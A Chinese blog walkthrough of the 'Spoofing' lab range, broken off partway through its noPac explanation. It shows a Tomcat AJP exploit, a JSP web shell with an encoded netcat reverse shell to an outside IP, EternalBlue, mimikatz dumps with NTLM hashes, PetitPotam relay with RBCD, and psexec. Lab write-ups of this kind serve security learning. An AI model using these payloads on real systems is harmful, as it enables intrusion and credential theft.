@@ -1,0 +1,378 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>Spoofing - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <div class="c-post__toc-empty">
+            <i class="fas fa-info-circle"></i> 本文暂无小节
+        </div>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">Spoofing</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2024-01-11 17:49</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2024-09-11 10:47</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/%e6%b8%97%e9%80%8f"><strong>渗透</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/%e6%98%a5%e7%a7%8b%e4%ba%91%e9%95%9c" class="c-post__tag">#春秋云镜</a>
+            </div>
+            <div class="c-post__description">
+                春秋云镜靶场
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><p>CVE-2020-1938 是 Apache Tomcat 中 AJP 连接器中的一个文件读取/包含漏洞。默认情况下，默认配置端口为 8009 时启用此功能。未经身份验证的远程攻击者可利用此漏洞从易受攻击的服务器读取 Web 应用程序文件。在易受攻击的服务器允许文件上传的情况下，攻击者可以在各种文件类型中上传恶意 JavaServer Pages （JSP） 代码，并触发此漏洞以获得远程代码执行 （RCE） [1]。</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">22/tcp   open     ssh            
+</span></span><span class="line"><span class="cl">445/tcp  filtered microsoft-ds
+</span></span><span class="line"><span class="cl">5900/tcp filtered vnc
+</span></span><span class="line"><span class="cl">8009/tcp open     ajp13
+</span></span><span class="line"><span class="cl">8080/tcp open     http-proxy
+</span></span></code></pre></div></div><p>8009端口</p>
+<p><code>python3 ajpShoot.py http://39.101.131.233:8080/ 8009  /WEB-INF/web.xml read</code></p>
+<p>读webxml</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">[&lt;] 200 200
+</span></span><span class="line"><span class="cl">[&lt;] Accept-Ranges: bytes
+</span></span><span class="line"><span class="cl">[&lt;] ETag: W/&#34;2489-1670857638305&#34;
+</span></span><span class="line"><span class="cl">[&lt;] Last-Modified: Mon, 12 Dec 2022 15:07:18 GMT
+</span></span><span class="line"><span class="cl">[&lt;] Content-Type: application/xml
+</span></span><span class="line"><span class="cl">[&lt;] Content-Length: 2489
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE web-app PUBLIC
+</span></span><span class="line"><span class="cl"> &#34;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&#34;
+</span></span><span class="line"><span class="cl"> &#34;http://java.sun.com/dtd/web-app_2_3.dtd&#34; &gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;web-app&gt;
+</span></span><span class="line"><span class="cl">  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  &lt;security-constraint&gt;
+</span></span><span class="line"><span class="cl">    &lt;display-name&gt;Tomcat Server Configuration Security Constraint&lt;/display-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;web-resource-collection&gt;
+</span></span><span class="line"><span class="cl">      &lt;web-resource-name&gt;Protected Area&lt;/web-resource-name&gt;
+</span></span><span class="line"><span class="cl">      &lt;url-pattern&gt;/upload/*&lt;/url-pattern&gt;
+</span></span><span class="line"><span class="cl">    &lt;/web-resource-collection&gt;
+</span></span><span class="line"><span class="cl">    &lt;auth-constraint&gt;
+</span></span><span class="line"><span class="cl">      &lt;role-name&gt;admin&lt;/role-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;/auth-constraint&gt;
+</span></span><span class="line"><span class="cl">  &lt;/security-constraint&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  &lt;error-page&gt;
+</span></span><span class="line"><span class="cl">    &lt;error-code&gt;404&lt;/error-code&gt;
+</span></span><span class="line"><span class="cl">    &lt;location&gt;/404.html&lt;/location&gt;
+</span></span><span class="line"><span class="cl">  &lt;/error-page&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  &lt;error-page&gt;
+</span></span><span class="line"><span class="cl">    &lt;error-code&gt;403&lt;/error-code&gt;
+</span></span><span class="line"><span class="cl">    &lt;location&gt;/error.html&lt;/location&gt;
+</span></span><span class="line"><span class="cl">  &lt;/error-page&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  &lt;error-page&gt;
+</span></span><span class="line"><span class="cl">    &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;
+</span></span><span class="line"><span class="cl">    &lt;location&gt;/error.html&lt;/location&gt;
+</span></span><span class="line"><span class="cl">  &lt;/error-page&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  &lt;servlet&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-class&gt;com.example.HelloServlet&lt;/servlet-class&gt;
+</span></span><span class="line"><span class="cl">  &lt;/servlet&gt;
+</span></span><span class="line"><span class="cl">  &lt;servlet-mapping&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;url-pattern&gt;/HelloServlet&lt;/url-pattern&gt;
+</span></span><span class="line"><span class="cl">  &lt;/servlet-mapping&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  &lt;servlet&gt;
+</span></span><span class="line"><span class="cl">    &lt;display-name&gt;LoginServlet&lt;/display-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-class&gt;com.example.LoginServlet&lt;/servlet-class&gt;
+</span></span><span class="line"><span class="cl">  &lt;/servlet&gt;
+</span></span><span class="line"><span class="cl">  &lt;servlet-mapping&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;url-pattern&gt;/LoginServlet&lt;/url-pattern&gt;
+</span></span><span class="line"><span class="cl">  &lt;/servlet-mapping&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  &lt;servlet&gt;
+</span></span><span class="line"><span class="cl">    &lt;display-name&gt;RegisterServlet&lt;/display-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-class&gt;com.example.RegisterServlet&lt;/servlet-class&gt;
+</span></span><span class="line"><span class="cl">  &lt;/servlet&gt;
+</span></span><span class="line"><span class="cl">  &lt;servlet-mapping&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;url-pattern&gt;/RegisterServlet&lt;/url-pattern&gt;
+</span></span><span class="line"><span class="cl">  &lt;/servlet-mapping&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  &lt;servlet&gt;
+</span></span><span class="line"><span class="cl">    &lt;display-name&gt;UploadTestServlet&lt;/display-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-class&gt;com.example.UploadTestServlet&lt;/servlet-class&gt;
+</span></span><span class="line"><span class="cl">  &lt;/servlet&gt;
+</span></span><span class="line"><span class="cl">  &lt;servlet-mapping&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;
+</span></span><span class="line"><span class="cl">  &lt;/servlet-mapping&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  &lt;servlet&gt;
+</span></span><span class="line"><span class="cl">    &lt;display-name&gt;DownloadFileServlet&lt;/display-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-class&gt;com.example.DownloadFileServlet&lt;/servlet-class&gt;
+</span></span><span class="line"><span class="cl">  &lt;/servlet&gt;
+</span></span><span class="line"><span class="cl">  &lt;servlet-mapping&gt;
+</span></span><span class="line"><span class="cl">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;
+</span></span><span class="line"><span class="cl">    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;
+</span></span><span class="line"><span class="cl">  &lt;/servlet-mapping&gt;
+</span></span><span class="line"><span class="cl">&lt;/web-app&gt;
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p><code>/UploadServlet</code></p>
+<p>文件包含rce</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    java.io.InputStream in = Runtime.getRuntime().exec(&#34;bash -c {echo,cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDguMTQ5LjE0Mi4xOTUgOTk5OSA+L3RtcC9m}|{base64,-d}|{bash,-i}&#34;).getInputStream();
+</span></span><span class="line"><span class="cl">    int a = -1;
+</span></span><span class="line"><span class="cl">    byte[] b = new byte[2048];
+</span></span><span class="line"><span class="cl">    out.print(&#34;&lt;pre&gt;&#34;);
+</span></span><span class="line"><span class="cl">    while((a=in.read(b))!=-1){
+</span></span><span class="line"><span class="cl">        out.println(new String(b));
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    out.print(&#34;&lt;/pre&gt;&#34;);
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></div></div><p>写公钥ssh</p>
+<p>然后fscan扫内网</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">root@ubuntu:~# cat /etc/hosts
+</span></span><span class="line"><span class="cl">127.0.0.1       localhost
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># The following lines are desirable for IPv6 capable hosts
+</span></span><span class="line"><span class="cl">::1     localhost       ip6-localhost   ip6-loopback
+</span></span><span class="line"><span class="cl">ff02::1 ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2 ip6-allrouters
+</span></span><span class="line"><span class="cl">127.0.1.1       s02g07017.cloud.em160.tbsite.net        s02g07017
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">172.22.11.76    ubuntu  ubuntu
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@ubuntu:~# ./f
+</span></span><span class="line"><span class="cl">flag/        fscan_amd64  
+</span></span><span class="line"><span class="cl">root@ubuntu:~# ./fscan_amd64 -h 172.22.11.76/24
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   ___                              _    
+</span></span><span class="line"><span class="cl">  / _ \     ___  ___ _ __ __ _  ___| | __ 
+</span></span><span class="line"><span class="cl"> / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /
+</span></span><span class="line"><span class="cl">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
+</span></span><span class="line"><span class="cl">\____/     |___/\___|_|  \__,_|\___|_|\_\   
+</span></span><span class="line"><span class="cl">                     fscan version: 1.8.2
+</span></span><span class="line"><span class="cl">start infoscan
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.11.76    is alive
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.11.6     is alive
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.11.45    is alive
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.11.26    is alive
+</span></span><span class="line"><span class="cl">[*] Icmp alive hosts len is: 4
+</span></span><span class="line"><span class="cl">172.22.11.76:22 open
+</span></span><span class="line"><span class="cl">172.22.11.6:88 open
+</span></span><span class="line"><span class="cl">172.22.11.45:135 open
+</span></span><span class="line"><span class="cl">172.22.11.6:135 open
+</span></span><span class="line"><span class="cl">172.22.11.76:8080 open
+</span></span><span class="line"><span class="cl">172.22.11.26:445 open
+</span></span><span class="line"><span class="cl">172.22.11.45:445 open
+</span></span><span class="line"><span class="cl">172.22.11.6:445 open
+</span></span><span class="line"><span class="cl">172.22.11.26:139 open
+</span></span><span class="line"><span class="cl">172.22.11.45:139 open
+</span></span><span class="line"><span class="cl">172.22.11.6:139 open
+</span></span><span class="line"><span class="cl">172.22.11.26:135 open
+</span></span><span class="line"><span class="cl">172.22.11.76:8009 open
+</span></span><span class="line"><span class="cl">[*] alive ports len is: 13
+</span></span><span class="line"><span class="cl">start vulscan
+</span></span><span class="line"><span class="cl">[*] NetInfo:
+</span></span><span class="line"><span class="cl">[*]172.22.11.6
+</span></span><span class="line"><span class="cl">   [-&gt;]XIAORANG-DC
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.11.6
+</span></span><span class="line"><span class="cl">[*] NetInfo:
+</span></span><span class="line"><span class="cl">[*]172.22.11.26
+</span></span><span class="line"><span class="cl">   [-&gt;]XR-LCM3AE8B
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.11.26
+</span></span><span class="line"><span class="cl">[*] WebTitle: http://172.22.11.76:8080  code:200 len:7091   title:后台管理
+</span></span><span class="line"><span class="cl">[+] 172.22.11.45        MS17-010        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
+</span></span><span class="line"><span class="cl">[*] NetBios: 172.22.11.26    XIAORANG\XR-LCM3AE8B           
+</span></span><span class="line"><span class="cl">[*] NetBios: 172.22.11.6     [+]DC XIAORANG\XIAORANG-DC     
+</span></span><span class="line"><span class="cl">[*] NetBios: 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1 
+</span></span><span class="line"><span class="cl">已完成 13/13
+</span></span><span class="line"><span class="cl">[*] 扫描结束,耗时: 9.528271579s
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>内网信息</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">(icmp) Target 172.22.11.76    is alive 本机
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.11.6     is alive DC
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.11.45    is alive XR-DESKTOP.xiaorang.lab  
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.11.26    is alive XIAORANG\XR-LCM3AE8B
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">[+] 172.22.11.45        MS17-010        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
+</span></span></code></pre></div></div><p>永恒之蓝打这个</p>
+<p>viper挂个代理</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240418090838.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240418090838.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>逆天为什么不显示</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains msfconsole
+</span></span><span class="line"><span class="cl">use exploit/windows/smb/ms17_010_eternalblue
+</span></span><span class="line"><span class="cl">set payload windows/x64/meterpreter/bind_tcp_uuid
+</span></span><span class="line"><span class="cl">set RHOSTS 172.22.11.45
+</span></span><span class="line"><span class="cl">exploit
+</span></span></code></pre></div></div><p>草泥马macos</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">load kiwi 
+</span></span><span class="line"><span class="cl">creds_all
+</span></span></code></pre></div></div><p>抓个hash</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">XR-DESKTOP$  XIAORANG  cd68cbe582e1d08166b2981baef42dfa  b3f98528844399e166b2b57afdfc2edaa1a04b68
+</span></span><span class="line"><span class="cl">yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f
+</span></span></code></pre></div></div><p>牛逼,上线内网机到Viper,只需要自动加完路由后选择对应信道就行</p>
+<p><code>execute -f 1713404502.exe</code></p>
+<p><code>https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.4.0/cme-ubuntu-latest-3.11.zip</code></p>
+<p>把这个文件下载下来先</p>
+<p><strong>CrackMapExec</strong></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">p4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav 
+</span></span><span class="line"><span class="cl">p4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam
+</span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240418101906.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240418101906.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div>[[Pasted image 20240418101950.png]]</p>
+<p><a href="https://forum.butian.net/share/1944">奇安信攻防社区-红队域渗透NTLM Relay：强制认证方式总结 (butian.net)</a></p>
+<p>参考了大师傅们的博客，发现这里使用的是<code>无ADCS + PetitPotam + NTLM</code>中继打法，思路大概如下</p>
+<p>1、用petitpotam触发目标访问HTTP服务</p>
+<p>2、目标使用webclient携带NTLM认证访问中继，并将NTLM认证中继到LDAP</p>
+<p>3、获取到机器账号身份</p>
+<p>4、以机器账户的身份修改其自身的msDS-AllowedToActOnBehalfOfOtherIdentity属性，从而允许我们访问到目标机器。</p>
+<p><strong>由于SSH的反向端口在转发监听的时候只会监听127.0.0.1，所以这里需要稍微改动</strong></p>
+<p>即使反向在转发79端口指定监听全部，端口79仍绑定在<code>127.0.0.1</code>。</p>
+<p>因此我们可以多加一条，将流量<code>0.0.0.0:80</code>转发到<code>127.0.0.1:79</code>，再反向转发回客户端本地的80，变相使得80监听在<code>0.0.0.0</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">ssh -i id_rsa root@39.101.131.233 -D 8.149.142.195:7777 -R \*:79:127.0.0.1:80
+</span></span><span class="line"><span class="cl">nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;
+</span></span></code></pre></div></div><p>第一行是把远程的79的流量转发到本地的80</p>
+<p>第二行是在目标服务器把80的流量转发到目录服务器79</p>
+<p>形成 本地80 &lt;-远 79 &lt;- 远 80</p>
+<p><code>p4 impacket-ntlmrelayx -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user 'xr-desktop$' --delegate-access</code></p>
+<p>用之前的机器设置rbcd</p>
+<p><code>p4 python3 PetiPotam.py -u yangmei -p 'xrihGHgoNZQ' -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26</code></p>
+<p><code>p4 impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :cd68cbe582e1d08166b2981baef42dfa xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">export KRB5CCNAME=Administrator.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">改下hosts
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">172.22.11.26 XR-LCM3AE8B.xiaorang.lab
+</span></span></code></pre></div></div><p><code>p4 psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk</code></p>
+<p>加用户</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">net user dionysus Qwer1234. /add
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">net localgroup administrators dionysus /add
+</span></span></code></pre></div></div><p>上线viper</p>
+<p>传个猕猴桃</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">sekurlsa::logonpasswords
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">Authentication Id : 0 ; 862543 (00000000:000d294f)
+</span></span><span class="line"><span class="cl">Session           : RemoteInteractive from 2
+</span></span><span class="line"><span class="cl">User Name         : zhanghui
+</span></span><span class="line"><span class="cl">Domain            : XIAORANG
+</span></span><span class="line"><span class="cl">Logon Server      : XIAORANG-DC
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/18 8:16:13
+</span></span><span class="line"><span class="cl">SID               : S-1-5-21-3598443049-773813974-2432140268-1133
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         [00000003] Primary
+</span></span><span class="line"><span class="cl">         * Username : zhanghui
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 1232126b24cdf8c9bd2f788a9d7c7ed1
+</span></span><span class="line"><span class="cl">         * SHA1     : f3b66ff457185cdf5df6d0a085dd8935e226ba65
+</span></span><span class="line"><span class="cl">         * DPAPI    : 4bfe751ae03dc1517cfb688adc506154
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : zhanghui
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : (null)
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : zhanghui
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG.LAB
+</span></span><span class="line"><span class="cl">         * Password : (null)
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">        cloudap :
+</span></span></code></pre></div></div><p>题目描述中提到了<code>noPac</code>，搜索发现这篇文章<a href="https://xz.aliyun.com/t/10694">https://xz.aliyun.com/t/10694</a></p>
+<p>漏洞原理大致如下</p>
+<p>1、我们创建了与DC机器账户名字相同的机器账号(不以$结尾，与CVE-2021-42278结合，此时AD未对域内机器用户名做验证)</p>
+<p>2、账户请求TGT后，更改账户名字，通过S4U2Self申请TGS 票据</p>
+<p>3、DC在TGS_REP阶段，这个账户不存在，DC用自己的密钥加密TGS 票据，提供一个属于该账号的PAC，此时得到一个高权限的ST</p>
